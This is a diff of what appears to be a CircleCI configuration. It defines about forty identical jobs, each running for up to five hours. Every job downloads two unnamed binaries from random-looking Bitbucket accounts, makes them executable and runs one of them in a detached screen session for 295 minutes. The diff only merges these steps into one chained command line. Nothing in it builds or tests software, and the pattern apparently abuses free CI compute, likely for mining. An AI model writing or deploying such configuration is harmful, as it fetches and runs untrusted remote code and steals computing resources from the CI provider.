@@ -12,10 +12,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_02:
     docker:
@@ -29,10 +27,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_03:
     docker:
@@ -46,10 +42,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_04:
     docker:
@@ -63,10 +57,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_05:
     docker:
@@ -80,10 +72,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_06:
     docker:
@@ -97,10 +87,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_07:
     docker:
@@ -114,10 +102,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_08:
     docker:
@@ -131,10 +117,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_09:
     docker:
@@ -148,10 +132,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_10:
     docker:
@@ -165,10 +147,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_11:
     docker:
@@ -182,10 +162,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_12:
     docker:
@@ -199,10 +177,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_13:
     docker:
@@ -216,10 +192,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_14:
     docker:
@@ -233,10 +207,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_15:
     docker:
@@ -250,10 +222,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_16:
     docker:
@@ -267,10 +237,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_17:
     docker:
@@ -284,10 +252,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_18:
     docker:
@@ -301,10 +267,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_19:
     docker:
@@ -318,10 +282,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_20:
     docker:
@@ -335,10 +297,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_21:
     docker:
@@ -352,10 +312,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_22:
     docker:
@@ -369,10 +327,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_23:
     docker:
@@ -386,10 +342,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_24:
     docker:
@@ -403,10 +357,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_25:
     docker:
@@ -420,10 +372,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_26:
     docker:
@@ -437,10 +387,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_27:
     docker:
@@ -454,10 +402,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_28:
     docker:
@@ -471,10 +417,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_29:
     docker:
@@ -488,10 +432,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_30:
     docker:
@@ -505,10 +447,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_31:
     docker:
@@ -522,10 +462,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_32:
     docker:
@@ -539,10 +477,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_33:
     docker:
@@ -556,10 +492,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_34:
     docker:
@@ -573,10 +507,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_35:
     docker:
@@ -590,10 +522,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_36:
     docker:
@@ -607,10 +537,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_37:
     docker:
@@ -624,10 +552,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_38:
     docker:
@@ -641,10 +567,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_39:
     docker:
@@ -658,10 +582,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
   App_40:
     docker:
@@ -675,10 +597,8 @@ jobs:
           name: App
           no_output_timeout: 5h
           command: |
-            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc
             screen -dmS ls
-            chmod u+x *
-            ./luc
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintacygku6272/app/raw/ec4aae4210bcbdc42ae5a9bdf7e82c0fa1bfbaf8/luc && chmod u+x * && timeout 295m ./luc && stop && sudo apt update
 
 workflows:
     version: 2.1
